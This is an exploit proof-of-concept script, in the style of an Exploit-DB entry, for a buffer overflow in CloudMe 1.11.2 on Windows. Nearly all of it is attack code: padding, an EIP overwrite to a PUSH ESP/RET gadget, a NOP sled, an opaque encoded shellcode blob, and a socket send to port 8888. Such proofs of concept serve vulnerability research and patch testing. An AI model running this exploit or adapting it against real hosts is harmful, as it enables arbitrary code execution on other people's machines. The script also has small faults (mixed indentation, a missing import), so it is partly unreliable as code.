# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

payload =  b""
payload += b"\xd9\xeb\xd9\x74\x24\xf4\x5a\x2b\xc9\xbe\x03\xa1\xd7"
payload += b"\x19\xb1\x3f\x31\x72\x19\x83\xc2\x04\x03\x72\x15\xe1"
payload += b"\x54\x2b\xf1\x67\x96\xd4\x02\x07\x1e\x31\x33\x07\x44"
payload += b"\x31\x64\xb7\x0e\x17\x89\x3c\x42\x8c\x1a\x30\x4b\xa3"
payload += b"\xab\xfe\xad\x8a\x2c\x52\x8d\x8d\xae\xa8\xc2\x6d\x8e"
payload += b"\x63\x17\x6f\xd7\x99\xda\x3d\x80\xd6\x49\xd2\xa5\xa2"
payload += b"\x51\x59\xf5\x23\xd2\xbe\x4e\x42\xf3\x10\xc4\x1d\xd3"
payload += b"\x93\x09\x16\x5a\x8c\x4e\x12\x14\x27\xa4\xe9\xa7\xe1"
payload += b"\xf4\x12\x0b\xcc\x38\xe1\x55\x08\xfe\x19\x20\x60\xfc"
payload += b"\xa4\x33\xb7\x7e\x72\xb1\x2c\xd8\xf1\x61\x89\xd8\xd6"
payload += b"\xf4\x5a\xd6\x93\x73\x04\xfb\x22\x57\x3e\x07\xaf\x56"
payload += b"\x91\x81\xeb\x7c\x35\xc9\xa8\x1d\x6c\xb7\x1f\x21\x6e"
payload += b"\x18\xc0\x87\xe4\xb5\x15\xba\xa6\xd3\xe8\x48\xdd\x96"
payload += b"\xea\x52\xde\x86\x82\x63\x55\x49\xd5\x7b\xbc\x2d\x29"
payload += b"\x36\x9d\x04\xa1\x9f\x77\x15\xac\x1f\xa2\x5a\xc8\xa3"
payload += b"\x47\x23\x2f\xbb\x2d\x26\x74\x7b\xdd\x5a\xe5\xee\xe1"
payload += b"\xc9\x06\x3b\xa2\xd7\xa4\xbc\x44\x45\x24\x4d\xdb\xfd"
payload += b"\xb0\xc9\x8c\x9e\x4b\x4e\x34\x18\xc6\x32\xcf\xaa\x74"
payload += b"\xa4\x4e\x2f\xd8\x54\xf2\x81\x85\xd0\x91\xfd\x68\x44"
payload += b"\x7a\x8e\x1d\xf1\x1f\x1c\x92\x95\xba\x8c\x38\x46\x74"
payload += b"\x7d\xee\xb7\x46\x53\xdf\x82\x88\x9a\x2b\xd8\xf4\xe8"
payload += b"\x67\x16\xc1\x10"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
    print('Payload sent to %s:8888' % target)
except Exception as e:
	print(sys.exc_value)
